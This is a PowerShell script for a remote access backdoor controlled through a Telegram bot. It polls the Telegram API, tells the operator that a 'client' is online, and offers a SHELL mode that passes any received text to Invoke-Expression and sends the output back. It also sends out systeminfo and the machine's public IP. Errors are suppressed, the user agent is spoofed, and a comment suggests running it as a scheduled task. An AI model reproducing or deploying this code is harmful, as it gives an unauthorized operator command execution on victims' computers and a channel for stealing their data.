# Define your bot token and chat ID
$botToken = ""
$chatId = ""
$apiUrl = "https://api.telegram.org/bot$botToken"
$ErrorActionPreference = 'silentlycontinue'
$UAG='Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0 Safari/534.6'
# Initial offset for updates
$offset = 1
# Function to send a message with buttons
function Send-TelegramMessage {
    param (
        [string]$chatId,
        [string]$text,
        [hashtable]$replyMarkup
    )

    $params = @{
        chat_id      = $chatId
        text         = $text
        reply_markup = $replyMarkup | ConvertTo-Json -Compress
    }

    Invoke-RestMethod -Uri "$apiUrl/sendMessage" -Method Post -UserAgent $UAG -ContentType "application/json" -Body ($params | ConvertTo-Json -Compress) | Out-Null
}


# Function to handle incoming updates
function Get-TelegramUpdates {
    param (
        [int]$offset = 0
    )

    $params = @{
        offset  = $offset
        timeout = 100
    }

    $response = Invoke-RestMethod -Uri "$apiUrl/getUpdates" -Method Post -UserAgent $UAG -ContentType "application/json" -Body ($params | ConvertTo-Json -Compress)
    return $response.result
}
# Function to handle before start message updates
function Delete-TelegramMessage {
   
   
    $response = Invoke-RestMethod -Uri "$apiUrl/getUpdates" -Method Post -UserAgent $UAG -ContentType "application/json"
    $update_id = $response[0].result[-1].update_id + 1
    $params = @{
        offset = $update_id
    }
    Invoke-RestMethod -Uri "$apiUrl/getUpdates" -Method Post -UserAgent $UAG -ContentType "application/json"-Body ($params | ConvertTo-Json -Compress) 
}
$main_buttons = @{
    keyboard          = @(
        @( { SHELL }, { Screenshot }),
        @( { Systeminfo }, { IP }),
        @( { Download }, { Upload })
    )
    one_time_keyboard = $true
    resize_keyboard   = $true
}
$shell_buttons = @{
    keyboard          = @(
        @( { Back }),
        @( )
    )
    one_time_keyboard = $true
    resize_keyboard   = $true
}


# if wana work like scheduled task after client online run previous task disable  Delete-TelegramMessage function 
Delete-TelegramMessage
Send-TelegramMessage -chatId $chatId -text 'Client Is Online (:'  -replyMarkup $main_buttons 
# Main loop to process updates
while ($true) {
    $updates = Get-TelegramUpdates -offset $offset

    foreach ($update in $updates) {
        $offset = $update.update_id + 1

        if ($update.message) {
            $chatId = $update.message.chat.id
            $messageText = $update.message.text

            # Check the message text and respond with buttons
            switch ($messageText) {
                "start" {
                 
                
                    Send-TelegramMessage -chatId $chatId -text "Choose an option:" -replyMarkup $main_buttons 
                }

                "SHELL" {
                 
                
                    Send-TelegramMessage -chatId $chatId -text "Send Powershell Command (:"-replyMarkup $shell_buttons 

                 


                    while ($true) {
                        if ($messageText -eq "Back" ) {
                            break
                        }
                        $updates = Get-TelegramUpdates -offset $offset

                        foreach ($update in $updates) {
                            $offset = $update.update_id + 1
                    
                            if ($update.message) {
                                $chatId = $update.message.chat.id
                                $messageText = $update.message.text
                                if ($messageText -eq "Back" ) {
                                    Send-TelegramMessage -chatId $chatId -text "Choose an option:" -replyMarkup $main_buttons 
                                    break
                                }
                                try {
                                    $exec = Invoke-Expression $messageText | Out-String 
                                
                                }
                                catch {
                                    $exec = $_.Exception.Message
                                }
                        
                                Send-TelegramMessage -chatId $chatId -text $exec
                                

                            }
                        }
                 

                        
                    }
                }

                "Screenshot" {
                    Send-TelegramMessage -chatId $chatId -text "You selected Option 2"
                }

                "Systeminfo" {
                    $exec = Invoke-Expression 'systeminfo' | Out-String 
                    Send-TelegramMessage -chatId $chatId -text $exec
                }
                "IP" {
                    $exec = Invoke-RestMethod -UserAgent $UAG  https://ident.me | Out-String 
                    Send-TelegramMessage -chatId $chatId -text $exec
                }
                "Download" {
                    # next update
                    $exec = Invoke-RestMethod -UserAgent $UAG https://ident.me | Out-String 
                    Send-TelegramMessage -chatId $chatId -text $exec
                }
                "Upload" {
                    # next update
                    $exec = Invoke-RestMethod -UserAgent $UAG https://ident.me | Out-String 
                    Send-TelegramMessage -chatId $chatId -text $exec
                }
                default {
                    Send-TelegramMessage -chatId $chatId -text "Choose an option:" -replyMarkup $main_buttons 
                }
            }
        }
    }
   
}
